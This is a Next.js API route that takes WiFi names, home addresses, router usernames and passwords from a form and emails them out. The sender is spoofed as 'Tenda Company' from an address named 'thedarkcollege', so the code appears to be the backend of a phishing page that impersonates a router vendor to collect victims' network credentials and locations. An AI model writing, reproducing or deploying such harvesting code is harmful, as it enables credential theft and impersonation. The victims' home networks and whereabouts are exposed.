import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

// Configure email transporter
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASSWORD
  }
});

export async function POST(request) {
  try {
    const data = await request.json();
    const { wifiName, address, routerName, username, password } = data;

    // Email content
    const emailContent = `
New WiFi Password Submission:

WiFi Name: ${wifiName}
Address: ${address}
Router: ${routerName}
Username: ${username}
Password: ${password}

Submitted at: ${new Date().toLocaleString()}
    `;

    // Send email
    const mailOptions = {
      from:  '" Tenda Company " <thedarkcollege@gmail.com>',

      to: process.env.RECIPIENT_EMAIL || process.env.EMAIL_USER,
      subject: 'New Tenda WiFi Password Submission',
      
      text: emailContent
    };

    await transporter.sendMail(mailOptions);

    console.log('WiFi Password Submission sent via email:', {
      wifiName,
      address,
      routerName,
      username,
      timestamp: new Date().toISOString()
    });

    return NextResponse.json({ 
      success: true, 
      message: 'Password submitted successfully' 
    });

  } catch (error) {
    console.error('Error processing submission:', error);
    return NextResponse.json(
      { success: false, message: 'Failed to process submission' },
      { status: 500 }
    );
  }
}

// Example implementation with a real email service (commented out):
/*
import nodemailer from 'nodemailer';

// Configure your email transporter
const transporter = nodemailer.createTransporter({
  service: 'gmail', // or your email service
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASSWORD
  }
});

// In the POST function above, replace the console.log with:
const mailOptions = {
  from: process.env.EMAIL_USER,
  to: 'your-email@example.com', // Replace with your email
  subject: 'New WiFi Password Submission',
  text: emailContent
};

await transporter.sendMail(mailOptions);
*/